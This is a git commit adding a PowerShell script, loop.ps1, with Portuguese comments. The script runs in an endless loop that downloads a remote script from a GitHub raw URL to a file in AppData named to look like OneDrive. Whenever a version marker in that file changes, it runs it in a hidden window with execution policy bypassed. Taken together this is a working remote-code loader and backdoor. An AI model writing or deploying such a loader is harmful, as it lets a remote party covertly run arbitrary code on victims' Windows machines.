6759f6a7ae27b5dfa75abf7e467d2094758b3bf5
Miguel Santos <miguelsantos029@gmail.com>
2024-12-09 14:31:58 +0000

    Add files via upload

---
+++ loop.ps1
@@ -0,0 +1,42 @@
+$downloadUrl = "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/windows.ps1?dl=1"
+$localFilePath = "$env:APPDATA\Microsoft\Windows\Onedrive.ps1"
+
+$headers = @{
+    "Cache-Control" = "no-store, no-cache, must-revalidate, proxy-revalidate"
+    "Pragma" = "no-cache"
+    "Expires" = "0"
+}
+
+function ObterNumeroAposHash {
+    param (
+        [string]$linha
+    )
+    # Extrai o número que aparece após o '#'
+    if ($linha -match "#\s*(\d+)") {
+        return $matches[1]
+    } else {
+        return $null
+    }
+}
+
+
+
+
+while ($true) {
+        if (Test-Path $localFilePath) {
+            Remove-Item -Path $localFilePath -Force
+        }
+        Start-Sleep -Seconds 3
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $localFilePath -Headers $headers
+        Start-Sleep -Seconds 3
+
+        $linhaatual = (Get-Content -Path $localFilePath -TotalCount 1).Trim()
+        $numeroatual = ObterNumeroAposHash -linha $linhaatual
+        Write-Host "$numeroatual"
+
+        if ($numeroInicial -ne $numeroAtual) {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -NoP -NonI -Exec Bypass -File $localFilePath"
+            $numeroInicial = $numeroAtual
+        }
+    Start-Sleep -Seconds 300
+}
